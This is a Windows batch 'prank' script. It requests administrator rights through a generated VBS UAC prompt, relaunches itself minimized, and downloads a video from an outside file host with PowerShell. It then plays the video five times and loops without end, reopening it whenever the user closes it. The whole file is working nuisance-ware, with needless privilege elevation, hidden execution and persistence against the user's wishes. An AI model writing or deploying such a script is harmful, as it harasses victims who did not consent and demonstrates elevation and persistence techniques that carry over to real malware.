@echo off
:: Check if running in minimized mode
if "%1"=="min" goto :minimized

:: Check for administrator privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    :: Create a VBS script to run the batch file as administrator
    set "batchPath=%~f0"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%batchPath%"" min", "", "runas", 1 >> "%temp%\elevate.vbs"
    :: Run the VBS script
    "%temp%\elevate.vbs"
    :: Clean up
    del "%temp%\elevate.vbs"
    exit /b
)

:: Minimize the script and rerun it in the background
start /min cmd /c "%~f0 min"
exit

:minimized
setlocal EnableDelayedExpansion

:: Define the download URL and the local file path
set "downloadUrl=https://h.top4top.io/m_31035dpws0.mp4"
set "localFilePath=%temp%\prank_video.mp4"

:download
:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%downloadUrl%' -OutFile '%localFilePath%'" >nul 2>&1

:: Check if the download was successful
if not exist "%localFilePath%" (
    echo Failed to download the file.
    exit /b
)

:play_video
:: Play the video in five separate tabs with a delay between each
for /L %%i in (1,1,5) do (
    start "" "%localFilePath%"
    timeout /t 5 /nobreak >nul
)

:check_video
:: Check if video process is running
tasklist /fi "imagename eq wmplayer.exe" | find /i "wmplayer.exe" > nul
if errorlevel 1 (
    echo Video closed. Reopening...
    start "" "%localFilePath%"
)

:: Wait for a while before checking again
timeout /t 5 /nobreak >nul

:: Go back to check the video again
goto check_video

:end
endlocal